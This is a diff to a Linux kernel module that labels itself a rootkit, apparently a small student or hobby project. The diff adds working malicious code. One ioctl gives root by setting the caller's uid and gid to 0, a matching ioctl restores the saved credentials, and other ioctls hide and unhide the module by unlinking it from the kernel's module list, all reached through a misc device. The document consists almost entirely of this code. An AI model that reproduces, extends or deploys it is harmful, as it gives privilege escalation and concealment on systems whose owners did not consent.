@@ -9,13 +9,30 @@
 #include <linux/rhashtable.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
+#include "bdoor.h"
 #include "bdoor_common.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Ethan, Cyrus, and Nick");
 MODULE_DESCRIPTION("rootkit kernel module");
-MODULE_VERSION("0.01");
+MODULE_VERSION("0.02");
 
+
+static bool creds_were_saved = false;
+static struct cred old_creds;
+
+static void save_old_creds(struct cred *cur_creds)
+{
+	old_creds.uid.val = cur_creds->uid.val;
+	old_creds.gid.val = cur_creds->gid.val;
+	old_creds.euid.val = cur_creds->euid.val;
+	old_creds.egid.val = cur_creds->egid.val;
+	old_creds.suid.val = cur_creds->suid.val;
+	old_creds.sgid.val = cur_creds->sgid.val;
+	old_creds.fsuid.val = cur_creds->fsuid.val;
+	old_creds.fsgid.val = cur_creds->fsgid.val;
+	creds_were_saved = true;
+}
 
 static long root_ioctl(struct file *file, unsigned long arg)
 {
@@ -28,6 +45,8 @@ static long root_ioctl(struct file *file, unsigned long arg)
 	if (root == NULL)
 		return -EAGAIN;
 
+	save_old_creds(root);
+
 	root->uid.val = root->gid.val = 0;
 	root->euid.val = root->egid.val = 0;
 	root->suid.val = root->sgid.val = 0;
@@ -35,6 +54,37 @@ static long root_ioctl(struct file *file, unsigned long arg)
 
 	commit_creds(root);
 	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
+	return 0;
+}
+
+static long unroot_ioctl(struct file *file, unsigned long arg)
+{
+	struct cred *orig;
+	printk(KERN_INFO "current_pid:%d\n",current->pid);
+	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
+	if (!creds_were_saved) {
+		printk(KERN_INFO "ROOTKIT: YOU HAVEN'T ROOTED YOURSELF YET\n");
+		goto out;
+	}
+
+	orig = prepare_creds();
+
+	//dunno which type of error to return if this fails, but this one seems good
+	if (orig == NULL)
+		return -EAGAIN;
+
+	orig->uid.val = old_creds.uid.val;
+	orig->gid.val = old_creds.gid.val;
+	orig->euid.val = old_creds.euid.val;
+	orig->egid.val = old_creds.egid.val;
+	orig->suid.val = old_creds.suid.val;
+	orig->sgid.val = old_creds.sgid.val;
+	orig->fsuid.val = old_creds.fsuid.val;
+	orig->fsgid.val = old_creds.fsgid.val;
+
+	commit_creds(orig);
+	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
+out:
 	return 0;
 }
 
@@ -68,14 +118,57 @@ static long replace_ioctl(struct file *file, unsigned long arg)
 	return 0;
 }
 
+static bool mod_is_hidden;
+static struct list_head *prev_module;
+
+static void hideme(void)
+{
+	mod_is_hidden = true;
+	prev_module = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+}
+
+
+static long hide_mod_ioctl(struct file *file, unsigned long arg)
+{
+	long ret = 0;
+	if (mod_is_hidden)
+		goto out;
+	hideme();
+out:
+	return ret;
+}
+
+static void showme(void)
+{
+	mod_is_hidden = false;
+	list_add(&THIS_MODULE->list, prev_module);
+}
+
+static long show_mod_ioctl(struct file *file, unsigned long arg)
+{
+	long ret = 0;
+	if (!mod_is_hidden)
+		goto out;
+	showme();
+out:
+	return ret;
+}
+
 static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
 	int err;
 	long ret;
+	printk(KERN_INFO "ahoy-hoy\n");
 	switch (cmd) {
 
 	case ROOT_IOCTL:
 		ret = root_ioctl(file,arg);
+		break;
+
+	case UNROOT_IOCTL:
+		printk(KERN_INFO "oyaoya\n");
+		ret = unroot_ioctl(file,arg);
 		break;
 
 	case URAND_IOCTL:
@@ -101,6 +194,14 @@ static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 	case REPLACE_IOCTL:
 		ret = replace_ioctl(file,arg);
                 break;
+
+	case HIDE_MOD_IOCTL:
+		ret = hide_mod_ioctl(file,arg);
+		break;
+
+	case SHOW_MOD_IOCTL:
+		ret = show_mod_ioctl(file,arg);
+		break;
 
 	default:
 		ret = -ENOTTY;
@@ -131,6 +232,7 @@ static struct miscdevice rkit_dev = {
         .fops = &rkit_fops,
 	.mode = S_IRUSR | S_IWUSR | S_IROTH,
 };
+
 
 static int __init rootkit_init(void)
 {
